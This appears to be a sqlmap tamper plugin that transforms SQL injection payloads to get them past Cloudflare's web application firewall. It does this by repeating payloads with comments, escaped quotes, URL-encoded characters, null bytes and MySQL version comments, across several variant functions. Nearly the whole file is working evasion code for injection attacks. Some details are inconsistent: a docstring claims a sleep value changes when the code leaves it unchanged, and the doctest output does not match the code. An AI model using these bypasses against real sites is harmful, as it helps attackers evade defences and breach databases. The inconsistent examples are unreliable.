#!/usr/bin/env python

# Author: CyberVaca , Luis Vacas de Santos
# Twitter: https://twitter.com/CyberVaca_

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Bypasses Cloudflare 403 by repeating payload with comments and escape chars

    Requirement:
        * MySQL

    Tested against:
        * Cloudflare WAF (403 bypass)
        * Time-based blind SQL injection

    Notes:
        * Original technique discovered for Cloudflare 403 bypass
        * Works by confusing WAF regex with repeated payloads and escape sequences
        * Transforms: (select(0)from(select(sleep(10)))v)
        * Into: (select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'\\"+(select(0)from(select(sleep(6)))v)
        
    Reference:
        * Cloudflare WAF bypass research
        * Time-based blind SQLi evasion

    >>> tamper("(SELECT SLEEP(5))")
    "(SELECT SLEEP(5))/*'+(SELECT SLEEP(5))+'\\\\"+(SELECT SLEEP(5))"
    """

    if not payload:
        return payload

    retVal = payload
    
    # Pattern to detect time-based payloads (sleep, benchmark, etc.)
    time_patterns = [
        r'\(select\s*\(\s*\d+\s*\)\s*from\s*\(\s*select\s*\(\s*sleep\s*\(\s*\d+\s*\)\s*\)\s*\)\s*\w+\s*\)',
        r'sleep\s*\(\s*\d+\s*\)',
        r'benchmark\s*\(',
        r'pg_sleep\s*\(',
        r'waitfor\s+delay',
    ]
    
    # Check if payload contains time-based injection
    is_time_based = False
    for pattern in time_patterns:
        if re.search(pattern, payload, re.IGNORECASE):
            is_time_based = True
            break
    
    if is_time_based:
        # Apply Cloudflare bypass technique: repeat payload with escape sequences
        # Pattern: payload/*'+payload+'\"+payload
        retVal = "%s/*'+%s+'\\\"+" % (payload, payload) + payload
    else:
        # For non-time-based payloads, apply simpler obfuscation
        # Add comment and escape sequences around the payload
        if "SELECT" in payload.upper() or "UNION" in payload.upper():
            retVal = "%s/*'%s'*/" % (payload, payload)
    
    return retVal


def tamper_aggressive(payload, **kwargs):
    """
    More aggressive version with URL encoding
    
    Transforms payload into:
    payload/*'%2Bpayload%2B'%5C"%2Bpayload
    """
    
    if not payload:
        return payload
    
    # URL encode the special characters
    # %2B = +
    # %5C = \
    # %22 = "
    
    retVal = "%s/*'%%2B%s%%2B'%%5C\"%%2B%s" % (payload, payload, payload)
    
    return retVal


def tamper_triple(payload, **kwargs):
    """
    Triple repetition with different escape sequences
    """
    
    if not payload:
        return payload
    
    # Three different escape patterns
    escapes = [
        "/*'",      # Comment + single quote
        "+'\\\"+",  # Plus + escaped double quote
        "+'\\'+",   # Plus + escaped single quote
    ]
    
    parts = []
    for i, esc in enumerate(escapes):
        if i == 0:
            parts.append(payload + esc)
        elif i == len(escapes) - 1:
            parts.append(payload)
        else:
            parts.append(payload + esc)
    
    retVal = ''.join(parts)
    
    return retVal


def tamper_with_nullbyte(payload, **kwargs):
    """
    Adds null byte variations for additional bypass
    """
    
    if not payload:
        return payload
    
    # Null byte can sometimes help bypass WAF
    retVal = "%s/*%%00'%%2B%s%%2B'%%5C\"%%2B%s" % (payload, payload, payload)
    
    return retVal


def tamper_mysql_specific(payload, **kwargs):
    """
    MySQL-specific bypass using version comments
    
    Uses /*!50000 ... */ syntax which is executed by MySQL but
    may be ignored by WAF
    """
    
    if not payload:
        return payload
    
    # Wrap in MySQL version comment
    retVal = "/*!50000%s*//*'%%2B/*!50000%s*/%%2B'%%5C\"%%2B/*!50000%s*/" % (payload, payload, payload)
    
    return retVal
